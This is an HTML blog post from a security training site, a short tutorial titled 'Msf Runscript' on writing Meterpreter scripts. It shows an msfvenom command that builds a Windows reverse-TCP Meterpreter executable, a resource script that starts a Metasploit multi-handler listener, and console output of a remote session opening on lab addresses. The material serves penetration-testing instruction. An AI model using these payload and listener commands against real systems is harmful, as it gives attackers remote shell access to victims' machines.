<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><title>Msf Runscript | Classroom</title>
<link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon><meta name=author content="Animesh Roy @anir0y  "><meta name=description content><title>Animesh Roy | Classroom Posts</title>
<meta name=title content="Animesh Roy | Blogs & Writeups"><meta name=description content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways."><script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-SPD6BXK0P5")</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","it10lq8bk1")</script><meta property="og:type" content="website"><meta property="og:url" content="https://classroom.anir0y.in/"><meta property="og:title" content="Animesh Roy | Blogs & Writeups"><meta property="og:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training"><meta property="og:image" content="https://i.imgur.com/Ji5C41H.png"><script type=text/javascript src=//cdn.cookie-script.com/s/e351defdc2a1efcd4623f186874c2e6c.js></script><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://classroom.anir0y.in/post/msf-runscript/"><meta property="twitter:title" content="Animesh Roy | Blogs & Writeups"><meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training"><meta property="twitter:image" content="https://i.imgur.com/Ji5C41H.png"><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><link rel=canonical href=https://classroom.anir0y.in/post/msf-runscript/><meta property="og:url" content="https://classroom.anir0y.in/post/msf-runscript/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="Msf Runscript"><meta property="og:description" content="WRITING METERPRETER SCRIPTS There are a few things you need to keep in mind when creating a new Meterpreter script.
Not all versions of Windows are the same Some versions of Windows have security countermeasures for some of the commands Not all command line tools are in all versions of Windows Some of the command line tools switches vary depending on the version of Windows For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-07T15:25:21+05:30"><meta property="article:modified_time" content="2021-04-07T15:25:21+05:30"><meta property="article:tag" content="Msf"><meta name=twitter:card content="summary"><meta name=twitter:title content="Msf Runscript"><meta name=twitter:description content="WRITING METERPRETER SCRIPTS There are a few things you need to keep in mind when creating a new Meterpreter script.
Not all versions of Windows are the same Some versions of Windows have security countermeasures for some of the commands Not all command line tools are in all versions of Windows Some of the command line tools switches vary depending on the version of Windows For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us."><link rel=stylesheet href=/css/semantic.min.css><link rel=stylesheet href=/css/icomoon.css><link rel=stylesheet href=/css/OverlayScrollbars.min.css><link rel=stylesheet href=/css/github-markdown.css><link rel=stylesheet href=/css/site.css><link rel=stylesheet href=/css/custom.css><style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style><link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css><link rel=stylesheet href=/css/custom.css></head><body class=default><nav class="ui secondary menu dream-menu"><div class=item><i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i></div><div class=item><i class="large link home icon" title=Home onclick='window.location.href="https://classroom.anir0y.in/"'></i></div><div class=item><i class="large link icon theme-switch" onclick=themeSwitch()></i></div><div class=item><i class="large link search icon" onclick=toggleSearch()></i></div></nav><div class=flip-container><div class=flipper><section class=front><div class=dream-max-width><div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse><aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside"><div class="ui segment actions"><button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
<i class="save icon"></i>
</button>
<a href="https://twitter.com/intent/tweet?text=Msf%20Runscript&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmsf-runscript%2f" class="ui circular twitter icon button"><i class="twitter icon"></i>
</a><a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmsf-runscript%2f" class="ui circular facebook icon button"><i class="facebook icon"></i></a></div></aside><div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img><section class="ui top attached segment"><header><h1 class="ui large header">Msf Runscript<div class="sub header">@
<a href=https://anir0y.in target=_blank>Animesh Roy</a>
|
Wednesday, Apr 7, 2021
| 2 minutes read
| Update at
Wednesday, Apr 7, 2021</div></h1></header><article class=main><h1 id=writing-meterpreter-scripts>WRITING METERPRETER SCRIPTS</h1><p>There are a few things you need to keep in mind when creating a new Meterpreter script.</p><ul><li>Not all versions of Windows are the same</li><li>Some versions of Windows have security countermeasures for some of the commands</li><li>Not all command line tools are in all versions of Windows</li><li>Some of the command line tools switches vary depending on the version of Windows</li></ul><p>For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us. This will rule out any problems with an exploit as we work through our script development.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST<span style=color:#f92672>=</span>192.168.1.101 -b <span style=color:#e6db74>&#34;\x00&#34;</span> -f exe -o Meterpreter.exe
</span></span><span style=display:flex><span>Found <span style=color:#ae81ff>10</span> compatible encoders
</span></span><span style=display:flex><span>Attempting to encode payload with <span style=color:#ae81ff>1</span> iterations of x86/shikata_ga_nai
</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>326</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>x86/shikata_ga_nai chosen with final size <span style=color:#ae81ff>326</span>
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>326</span> bytes
</span></span><span style=display:flex><span>Saved as: Meterpreter.exe
</span></span></code></pre></div><p>Wonderful. Now, we move the executable to our Windows machine that will be our target for the script we are going to write. We just have to set up our listener. To do this, lets create a short script to start up multi-handler for us.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# touch meterpreter.rc
</span></span><span style=display:flex><span>root@kali:~# echo use exploit/multi/handler &gt;&gt; meterpreter.rc
</span></span><span style=display:flex><span>root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; meterpreter.rc
</span></span><span style=display:flex><span>root@kali:~# echo set LHOST 192.168.1.184 &gt;&gt; meterpreter.rc
</span></span><span style=display:flex><span>root@kali:~# echo set ExitOnSession false &gt;&gt; meterpreter.rc
</span></span><span style=display:flex><span>root@kali:~# echo exploit -j -z &gt;&gt; meterpreter.rc
</span></span><span style=display:flex><span>root@kali:~# cat meterpreter.rc
</span></span><span style=display:flex><span>use exploit/multi/handler
</span></span><span style=display:flex><span>set PAYLOAD windows/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>set LHOST 192.168.1.184
</span></span><span style=display:flex><span>set ExitOnSession false
</span></span><span style=display:flex><span>exploit -j -z
</span></span></code></pre></div><p>Now, all that remains is to start up msfconsole with our our resource script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# msfconsole -r meterpreter.rc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#f92672>=[</span> metasploit v4.8.2-2014021901 <span style=color:#f92672>[</span>core:4.8 api:1.0<span style=color:#f92672>]</span> <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>1265</span> exploits - <span style=color:#ae81ff>695</span> auxiliary - <span style=color:#ae81ff>202</span> post <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>330</span> payloads - <span style=color:#ae81ff>32</span> encoders - <span style=color:#ae81ff>8</span> nops      <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>resource&gt; use exploit/multi/handler
</span></span><span style=display:flex><span>resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>PAYLOAD <span style=color:#f92672>=</span>&gt; windows/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>resource&gt; set LHOST 192.168.1.184
</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=</span>&gt; 192.168.1.184
</span></span><span style=display:flex><span>resource&gt; set ExitOnSession false
</span></span><span style=display:flex><span>ExitOnSession <span style=color:#f92672>=</span>&gt; false
</span></span><span style=display:flex><span>resource&gt; exploit -j -z
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Handler binding to LHOST 0.0.0.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting the payload handler...
</span></span></code></pre></div><p>upon execution</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>718336</span> bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>192.168.1.158:4444 -&gt; 192.168.1.104:1043<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>handler<span style=color:#f92672>)</span> &gt; sessions -i <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 1...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt;
</span></span></code></pre></div></article></section></div></div><footer class="ui basic center aligned segment" style=background-color:transparent><p>© 2010 - 2024 Classroom</p></footer></div></section><section class=back><div class=dream-max-width><header class="ui basic very padded segment dream-header"><div class="ui small circular image"><img src=/img/avatar.jpeg></div><div class=content><h1 class="ui medium header">Reading Stuffs<div class="sub header"></div></h1><article class="ui horizontal list"><a class=item href=/categories><i class="th list icon" title="All Categories"></i>
</a><a class=item href=/tags><i class="tags icon" title="All Tags"></i></a></article></div></header><div class="ui relaxed grid dream-grid dream-back"><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment"><h3 class="ui header">Social Links</h3><nav class="ui secondary menu dream-menu dream-socials"><div class=item><a href=/index.xml><i class="large rss square icon" title=RSS></i></a></div><div class=item><a href=mailto:classroom@anir0y.in><i class="large mail icon" title=Email></i></a></div><div class=item><a href=https://twitter.com/anir0y target=_blank><i class="large twitter icon" title=Twitter></i></a></div><div class=item><a href=https://facebook.com/0xanir0y target=_blank><i class="large facebook icon" title=Facebook></i></a></div><div class=item><a href=https://instagram.com/0xanir0y target=_blank><i class="large instagram icon" title=Instagram></i></a></div><div class=item><a href=https://www.linkedin.com/in/anir0y target=_blank><i class="large linkedin icon" title=Linkedin></i></a></div><div class=item><a href=https://github.com/anir0y target=_blank><i class="large github icon" title=GitHub></i></a></div></nav></article></div><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment">YOU CAN REUSE MY CONTENT</article></div></div></div></section></div></div><script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(e,t,n){var o,i=e.getElementsByTagName(t)[0],s=window.twttr||{};return e.getElementById(n)?s:(o=e.createElement(t),o.id=n,o.src="https://platform.twitter.com/widgets.js",i.parentNode.insertBefore(o,i),s._e=[],s.ready=function(e){s._e.push(e)},s)}(document,"script","twitter-wjs"))</script><script src=/js/jquery.min.js></script><script src=/js/semantic.min.js></script><script src=/js/jquery.overlayScrollbars.min.js></script><script src=/js/header.js></script><script src=/js/main.js></script><script src=/js/theme.js></script><script src=/js/html2canvas.min.js></script><script src=/js/post.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script><script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var e=localStore.getItem("hugo-theme-dream-is-dark"),e=e?e:window.defaultDark?"y":e,t="tomorrow",n="tomorrow-night",s=e==="y"?n:t;$("link[data-highlight]").attr("href","https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/"+s+".min.css"),$("pre").css("background",e==="y"?"#333":"")}</script><div class="ui inverted segment" id=dream-search><div class="ui search"><div class="ui transparent input"><input class=prompt type=text placeholder=Search></div><div class=results></div></div></div><script>$(document).ready(function(){$.getJSON("https://classroom.anir0y.in//index.json",function(e){$(".ui.search").search({source:e,searchFields:["title"],showNoResults:!0})})})</script><script src=/js/search.js></script></body></html>